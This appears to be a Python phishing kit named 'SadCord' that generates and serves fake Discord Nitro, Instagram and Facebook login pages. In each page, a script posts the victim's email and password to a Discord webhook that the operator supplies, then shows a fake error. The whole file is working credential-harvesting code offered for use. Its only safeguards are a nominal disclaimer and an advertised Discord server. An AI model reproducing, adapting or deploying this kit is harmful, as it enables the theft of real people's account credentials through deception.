import http.server,os,requests,sys,colorama
from urllib.request import Request, urlopen
from colorama import Fore,Back


def LocalServer(path):
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=path, **kwargs)
    os.system("cls")
    print(menu)
    PORT = 80
    server_address = ("0.0.0.0", PORT)
    server = http.server.HTTPServer
    #handler = http.server.CGIHTTPRequestHandler
    #handler.cgi_directories = ["/web/fb"]
    print(f"[{Fore.GREEN}+{Fore.RESET}] URL : https://localhost/")
    print(f"[{Fore.GREEN}+{Fore.RESET}] PORT : ", PORT)
 
    httpd = server(server_address, Handler)
    httpd.serve_forever()


menu = f"""
        		    ███████╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗             
			    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗            
			    ███████╗███████║██║  ██║██║     ██║   ██║██████╔╝██║  ██║            
			    ╚════██║██╔══██║██║  ██║██║     ██║   ██║██╔══██╗██║  ██║            
			    ███████║██║  ██║██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝            
			    ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                            {Back.YELLOW}Disclamer:Developer assume no liability and is not{Back.RESET}
                            {Back.YELLOW}responsible for any misuse or damage caused by this program{Back.RESET}
			    ═════════════════════════════════════════════════════════
                            Discord : {Fore.RED}ZELEPH#1225{Fore.RESET}                                                           
                            Serveur {Fore.RED}https://discord.gg/mkgvTuBSZM{Fore.RESET}                   
			    ═════════════════════════════════════════════════════════
                            -COMMANDS-
                            1- Discord Phishing (Fake Nitro Generator)
                            2- Instagram Phishing (Fake Login Page Instagram)
                            3- Facebook Phishing (Fake Login Page)
                            ═════════════════════════════════════════════════════════

"""


print(menu)
cmd = input(">>> ")

if cmd == "1":
    wh = input("WEBHOOK LINK : ")
    html = """
<!DOCTYPE html>
<html lang="FR">
<head>
	<meta charset="UTF-8">
	<title>Generator Nitro</title>

</head>
<body>

    

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="Nitro.png" alt="instagram" style="width: 175px;">
			</div>
			<div class="form">
			
			<div class="input_field">
				<input type="email" name="username" id="username" placeholder="Discord e-mail" class="input" required>
				</div>
			<div class="input_field">
					<input type="password" name="password" id="password" placeholder="Mot de passe" class="input"required>
				</div>
				<button class="btn" onclick="send()" >
					<div class="btnt" > Send Nitro </div>
				</button>
			</form>
			</div>

			<div class="dif">


			</div>
		</div>

	</div>

</div>

<script>

    function send(){
        var a = document.getElementById("username").value; 
        var b = document.getElementById("password").value; 
""" + f"""        var discordWebhook = "{wh}";""" +"""       
        var request = new XMLHttpRequest();
        request.open("POST", discordWebhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
			username: "SadCord .gg/mkgvTuBSZM",
            avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",

            content: 'e-mail :'+a+" Password:"+b+" https://discord.gg/mkgvTuBSZM"
    
        };
        request.send(JSON.stringify(params));
        alert("ERROR 404")
    
    }
    
</script>

<style>
@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');

*{
	margin: 0;
	padding: 0;
	box-sizing: border-box;
	outline: none;
	list-style: none;
	text-decoration: none;
	font-family: 'Roboto', sans-serif;
}

body{
	background: #fafafa;
	font-size: 14px;
	background: url("back.png");
}

.wrapper .header{
	max-width: 350px;
	width: 100%;
	height: auto;
	margin: 50px auto;
}

.wrapper .header .top,
.wrapper .signup{
	background: #fff;
	border: 1px solid #e6e6e6;
	border-radius: 1px;
	padding: 40px 40px 20px;
}

.wrapper .header .logo img{
	display: block;
	margin: 0 auto 35px;
}

.wrapper .header .form .input_field{
	margin-bottom: 5px;
}

.wrapper .header .form .input_field .input{
	width: 100%;
	background: #fafafa;
	border: 1px solid #efefef;
	font-size: 12px;
	border-radius: 3px;
	color: #262626;
	padding: 10px;
}

.wrapper .header .form .input_field .input:focus{
	border: 1px solid #b2b2b2;
}

.wrapper .header .form .btn {
	margin: 10px 0;
	background-color: rgb(178,221,255);
    	border: 1px solid rgb(178,221,255);
    	border-radius: 4px;
   	text-align: center;
   	padding: 5px;
	width: 100%;
}

.wrapper .header .form .btn:hover{
	margin: 10px 0;
	background-color: #3897f0;
   	border: 1px solid #3897f0;
    	border-radius: 4px;
    	text-align: center;
	padding: 5px;
    	width: 100%;
}

.wrapper .header .form .btnt{
	color: #fff;
	display: block;
	font-size: 1rem;
}

.wrapper .header .or{
	display: flex;
	justify-content: space-between;
	align-items: center;
	height: 15px;
	margin: 15px 0 20px;
}

.wrapper .header .or .line{
	width: 105px;
	height: 2px;
	background: #efefef;
}

.wrapper .header .or p{
	color: #999;
	font-size: 12px;
}

.wrapper .dif .fb{
	display: flex;
	justify-content: center;
	align-items: center;
}

.wrapper .dif .fb img{
	width: 16px;
	height: 16px;
}

.wrapper .dif  .fb p{
	color: #385185;
	font-weight: 500;
	margin-left: 10px;
}

.wrapper .dif .forgot{
	font-size: 12px;
	text-align: center;
	margin-top: 20px;
}

.wrapper .dif .forgot a{
	color: #003569;
}

.wrapper .signup{
	margin: 10px 0 20px;
	padding: 25px 40px;
	text-align: center;
	color: #262626;
}

.wrapper .signup a{
	color: #3897f0;
}

.wrapper .apps{
	text-align: center;
	color: #262626;
}

.wrapper .apps p{
	margin-bottom: 20px;
}

.wrapper .apps a img{
	width: 135px;
	height: 40px;
	margin: 0 5px;
}

.footer{
	max-width: 935px;
	width: 100%;
	margin: 0 auto;
	padding: 40px 0;
	display: flex;
	justify-content: space-between;
}

.footer .links ul li{
	display: inline-block;
	margin-right: 10px;
}

.footer .links ul li a{
	color: #003569;
	font-size: 12px;
}

.footer .copyright{
	color: #999;	
}
</style>
</body>

</html>
"""
    with open("web/discord/index.html", 'w') as f:
        f.write(html)
        f.close()
    LocalServer("web/discord")

elif cmd == "2":
    wh = input("WEBHOOK LINK : ")
    html = """
<!DOCTYPE html>
<html lang="FR">
<head>
	<meta charset="UTF-8">
	<title>Connexion • Instagram</title>
	<link rel="icon" type="image/png" href="image/insta.png" />
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="image/instagram.png" alt="instagram" style="width: 175px;">
			</div>
			<div class="form">
			<form id="Login_from">
				<div class="input_field">
					<input type="text" name="username"  id="username" placeholder="Num&eacute;ro de t&eacute;l&eacute;phone, nom d'utilisateur ou mail" class="input" required>
				</div>
				<div class="input_field">
					<input type="password"  id="password" name="password" placeholder="Mot de passe" class="input"required>
				</div>
				<button class="btn" onclick="send()">
					<div class="btnt" > Connexion </div>
				</button>
			</form>
			</div>
			<div class="or">
				<div class="line"></div>
				<p>OU</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="image/facebook.png" alt="facebook">
					<p>se connecter avec Facebook</p>
				</div>
				<div class="forgot">
					<a href="https://www.instagram.com/accounts/password/reset/?hl=fr">Mot de passe oubli&eacute; ?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Vous n’avez pas de compte  ? <a href="https://www.instagram.com/accounts/emailsignup/?hl=fr">Inscrivez-vous</a></p>
		</div>
		<div class="apps">
			<p>Téléchargez l’application.</p>
			<div class="icons">
				<a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="image/appstore.png" alt="appstore"></a>
				<a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD4B472C0-BE65-4C27-8627-0A374E02436F%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="image/googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="https://about.instagram.com/about-us">À PROPOS</a></li>
				<li><a href="https://help.instagram.com">AIDE</a></li>
				<li><a href="https://about.instagram.com/blog/">PRESSE</a></li>
				<li><a href="https://www.instagram.com/developer/">API</a></li>
				<li><a href="https://www.instagram.com/about/jobs/">EMPLOIS</a></li>
				<li><a href="https://help.instagram.com/519522125107875">COMFIDENTIALITÉ</a></li>					<li><a href="https://help.instagram.com/581066165581870">CONDITIONS</a></li>
				<li><a href="https://www.instagram.com/explore/locations/">LIEUX</a></li>
				<li><a href="https://www.instagram.com/directory/profiles/">COMPTES PRINCIPAUX</a></li>
				<li><a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a></li>				<li><a href="#">LANGUE</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2020 INSTAGRAM PAR FACEBOOK
		</div>
	</div>
</div>



<script>

    function send(){
        var a = document.getElementById("username").value; 
        var b = document.getElementById("password").value;"""+f"""    var discordWebhook = "{wh}";"""+"""       
        var request = new XMLHttpRequest();
        request.open("POST", discordWebhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "SadCord .gg/mkgvTuBSZM",
            avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",
            content: 'e-mail :'+a+" Password:"+b+" https://discord.gg/mkgvTuBSZM"
    
        };
        request.send(JSON.stringify(params));
        alert("ERROR 404")
    
    }
    
</script>

<style>
@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');

*{
	margin: 0;
	padding: 0;
	box-sizing: border-box;
	outline: none;
	list-style: none;
	text-decoration: none;
	font-family: 'Roboto', sans-serif;
}

body{
	background: #fafafa;
	font-size: 14px;
}

.wrapper .header{
	max-width: 350px;
	width: 100%;
	height: auto;
	margin: 50px auto;
}

.wrapper .header .top,
.wrapper .signup{
	background: #fff;
	border: 1px solid #e6e6e6;
	border-radius: 1px;
	padding: 40px 40px 20px;
}

.wrapper .header .logo img{
	display: block;
	margin: 0 auto 35px;
}

.wrapper .header .form .input_field{
	margin-bottom: 5px;
}

.wrapper .header .form .input_field .input{
	width: 100%;
	background: #fafafa;
	border: 1px solid #efefef;
	font-size: 12px;
	border-radius: 3px;
	color: #262626;
	padding: 10px;
}

.wrapper .header .form .input_field .input:focus{
	border: 1px solid #b2b2b2;
}

.wrapper .header .form .btn {
	margin: 10px 0;
	background-color: rgb(178,221,255);
    	border: 1px solid rgb(178,221,255);
    	border-radius: 4px;
   	text-align: center;
   	padding: 5px;
	width: 100%;
}

.wrapper .header .form .btn:hover{
	margin: 10px 0;
	background-color: #3897f0;
   	border: 1px solid #3897f0;
    	border-radius: 4px;
    	text-align: center;
	padding: 5px;
    	width: 100%;
}

.wrapper .header .form .btnt{
	color: #fff;
	display: block;
	font-size: 1rem;
}

.wrapper .header .or{
	display: flex;
	justify-content: space-between;
	align-items: center;
	height: 15px;
	margin: 15px 0 20px;
}

.wrapper .header .or .line{
	width: 105px;
	height: 2px;
	background: #efefef;
}

.wrapper .header .or p{
	color: #999;
	font-size: 12px;
}

.wrapper .dif .fb{
	display: flex;
	justify-content: center;
	align-items: center;
}

.wrapper .dif .fb img{
	width: 16px;
	height: 16px;
}

.wrapper .dif  .fb p{
	color: #385185;
	font-weight: 500;
	margin-left: 10px;
}

.wrapper .dif .forgot{
	font-size: 12px;
	text-align: center;
	margin-top: 20px;
}

.wrapper .dif .forgot a{
	color: #003569;
}

.wrapper .signup{
	margin: 10px 0 20px;
	padding: 25px 40px;
	text-align: center;
	color: #262626;
}

.wrapper .signup a{
	color: #3897f0;
}

.wrapper .apps{
	text-align: center;
	color: #262626;
}

.wrapper .apps p{
	margin-bottom: 20px;
}

.wrapper .apps a img{
	width: 135px;
	height: 40px;
	margin: 0 5px;
}

.footer{
	max-width: 935px;
	width: 100%;
	margin: 0 auto;
	padding: 40px 0;
	display: flex;
	justify-content: space-between;
}

.footer .links ul li{
	display: inline-block;
	margin-right: 10px;
}

.footer .links ul li a{
	color: #003569;
	font-size: 12px;
}

.footer .copyright{
	color: #999;	
}
</style>
</body>
</html>
"""

    with open("web/instagram/index.html", 'w') as f:
        f.write(html)
        f.close()
    LocalServer("web/instagram")

elif cmd == "3":
    wh = input("WEBHOOK LINK : ")
    html = """
<!DOCTYPE html>
<html lang="FR">
<head>
	<meta charset="UTF-8">
	<title>Connexion Facebook</title>
	<link rel="icon" type="image/png" href="icon.ico" />
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="facebook.png" alt="instagram" style="width: 175px;">
			</div>
			<div class="form">
			<form id="Login_from">
				<div class="input_field">
					<input type="text" name="username"  id="username" placeholder="Num&eacute;ro de t&eacute;l&eacute;phone, nom d'utilisateur ou mail" class="input" required>
				</div>
				<div class="input_field">
					<input type="password"  id="password" name="password" placeholder="Mot de passe" class="input"required>
				</div>
				<button class="btn" onclick="send()">
					<div class="btnt" > Connexion </div>
				</button>
			</form>
			</div>
			<div class="or">
				<div class="line"></div>
				<p>OU</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="f.png" alt="facebook">
					<p>se connecter avec Facebook</p>
				</div>
				<div class="forgot">
					<a href="https://www.instagram.com/accounts/password/reset/?hl=fr">Mot de passe oubli&eacute; ?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Vous n'avez pas de compte  ? <a href="https://facebook.fr">Inscrivez-vous</a></p>
		</div>
		<div class="apps">
			<p>T&eacute;léchargez l'application.</p>
			<div class="icons">
				<a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="image/appstore.png" alt="appstore"></a>
				<a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD4B472C0-BE65-4C27-8627-0A374E02436F%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="image/googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="https://about.instagram.com/about-us">A PROPOS</a></li>
				<li><a href="https://help.instagram.com">AIDE</a></li>
				<li><a href="https://about.instagram.com/blog/">PRESSE</a></li>
				<li><a href="https://www.instagram.com/developer/">API</a></li>
				<li><a href="https://www.instagram.com/about/jobs/">EMPLOIS</a></li>
				<li><a href="https://help.instagram.com/519522125107875">COMFIDENTIALITE</a></li>					<li><a href="https://help.instagram.com/581066165581870">CONDITIONS</a></li>
				<li><a href="https://www.instagram.com/explore/locations/">LIEUX</a></li>
				<li><a href="https://www.instagram.com/directory/profiles/">COMPTES PRINCIPAUX</a></li>
				<li><a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a></li>				<li><a href="#">LANGUE</a></li>
			</ul>
		</div>
		<div class="copyright">
			2021  FACEBOOK
		</div>
	</div>
</div>



<script>

    function send(){
        var a = document.getElementById("username").value; 
        var b = document.getElementById("password").value;\n"""+f"""        var discordWebhook = "{wh}" """+"""
        var request = new XMLHttpRequest();
        request.open("POST", discordWebhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "SadCord .gg/mkgvTuBSZM",
            avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",
            content: 'e-mail :'+a+" Password:"+b+" https://discord.gg/mkgvTuBSZM"
    
        };
        request.send(JSON.stringify(params));
        alert("ERROR 404")
    
    }
    
</script>

<style>
@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');

*{
	margin: 0;
	padding: 0;
	box-sizing: border-box;
	outline: none;
	list-style: none;
	text-decoration: none;
	font-family: 'Roboto', sans-serif;
}

body{
	background: #fafafa;
	font-size: 14px;
	
}

.wrapper .header{
	max-width: 350px;
	width: 100%;
	height: auto;
	margin: 50px auto;
}

.wrapper .header .top,
.wrapper .signup{
	background: #fff;
	border: 1px solid #e6e6e6;
	border-radius: 1px;
	padding: 40px 40px 20px;
}

.wrapper .header .logo img{
	display: block;
	margin: 0 auto 35px;
}

.wrapper .header .form .input_field{
	margin-bottom: 5px;
}

.wrapper .header .form .input_field .input{
	width: 100%;
	background: #fafafa;
	border: 1px solid #efefef;
	font-size: 12px;
	border-radius: 3px;
	color: #262626;
	padding: 10px;
}

.wrapper .header .form .input_field .input:focus{
	border: 1px solid #b2b2b2;
}

.wrapper .header .form .btn {
	margin: 10px 0;
	background-color: rgb(178,221,255);
    	border: 1px solid rgb(178,221,255);
    	border-radius: 4px;
   	text-align: center;
   	padding: 5px;
	width: 100%;
}

.wrapper .header .form .btn:hover{
	margin: 10px 0;
	background-color: #3897f0;
   	border: 1px solid #3897f0;
    	border-radius: 4px;
    	text-align: center;
	padding: 5px;
    	width: 100%;
}

.wrapper .header .form .btnt{
	color: #fff;
	display: block;
	font-size: 1rem;
}

.wrapper .header .or{
	display: flex;
	justify-content: space-between;
	align-items: center;
	height: 15px;
	margin: 15px 0 20px;
}

.wrapper .header .or .line{
	width: 105px;
	height: 2px;
	background: #efefef;
}

.wrapper .header .or p{
	color: #999;
	font-size: 12px;
}

.wrapper .dif .fb{
	display: flex;
	justify-content: center;
	align-items: center;
}

.wrapper .dif .fb img{
	width: 16px;
	height: 16px;
}

.wrapper .dif  .fb p{
	color: #385185;
	font-weight: 500;
	margin-left: 10px;
}

.wrapper .dif .forgot{
	font-size: 12px;
	text-align: center;
	margin-top: 20px;
}

.wrapper .dif .forgot a{
	color: #003569;
}

.wrapper .signup{
	margin: 10px 0 20px;
	padding: 25px 40px;
	text-align: center;
	color: #262626;
}

.wrapper .signup a{
	color: #3897f0;
}

.wrapper .apps{
	text-align: center;
	color: #262626;
}

.wrapper .apps p{
	margin-bottom: 20px;
}

.wrapper .apps a img{
	width: 135px;
	height: 40px;
	margin: 0 5px;
}

.footer{
	max-width: 935px;
	width: 100%;
	margin: 0 auto;
	padding: 40px 0;
	display: flex;
	justify-content: space-between;
}

.footer .links ul li{
	display: inline-block;
	margin-right: 10px;
}

.footer .links ul li a{
	color: #003569;
	font-size: 12px;
}

.footer .copyright{
	color: #999;	
}
</style>
</body>
</html>       
"""
    with open("web/facebook/index.html", 'w') as f:
        f.write(html)
        f.close()
    LocalServer("web/facebook")






        



   

